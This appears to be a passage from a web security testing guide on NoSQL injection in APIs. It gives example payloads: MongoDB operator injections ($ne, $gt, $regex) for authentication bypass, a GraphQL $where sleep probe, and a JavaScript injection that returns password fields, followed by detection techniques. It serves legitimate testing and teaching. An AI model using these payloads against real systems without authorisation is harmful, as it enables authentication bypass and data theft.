...
### API-Specific NoSQL Injection Testing

NoSQL injection is particularly relevant when testing APIs, as many modern APIs use NoSQL databases like MongoDB, CouchDB, or Redis for data storage.

#### JSON Body Injection in REST APIs

APIs accepting JSON bodies are common targets for NoSQL injection:
...
This payload exploits MongoDB's query operators. If the values are passed directly to a MongoDB query, this would match any user where username and password are greater than an empty string (effectively bypassing authentication).

Other operator-based injections to test:
...
Some APIs vulnerable to NoSQL injection may accept arrays:
...
{
  "category": {"$in": ["electronics", {"$gt": ""}]}
}
```

#### Testing for NoSQL Injection in Query Parameters

API query parameters can also be injection points:

```http
GET /api/v1/products?category[$ne]=null&price[$gt]=0 HTTP/1.1
```

or using array notation:

```http
GET /api/v1/users?username[$regex]=admin.* HTTP/1.1
```

#### GraphQL NoSQL Injection

GraphQL APIs using NoSQL backends may be vulnerable:

```graphql
query {
  user(filter: "{\"$where\": \"sleep(5000) || true\"}") {
    id
    name
  }
}
...
```json
{
  "query": "query getUser($filter: JSON!) { user(filter: $filter) { id } }",
  "variables": {
    "filter": {"$gt": ""}
  }
}
...
Some NoSQL databases allow JavaScript execution:
...
{
  "query": "'; return this.password; var x='"
}
```

#### Detection Techniques for APIs

1. **Error-based detection**: Send malformed operators and observe error responses
2. **Timing-based detection**: Use sleep functions if the database supports JavaScript
3. **Boolean-based detection**: Compare responses between always-true and always-false conditions
...
For related testing, see [Testing for SQL Injection](05-Testing_for_SQL_Injection.md).
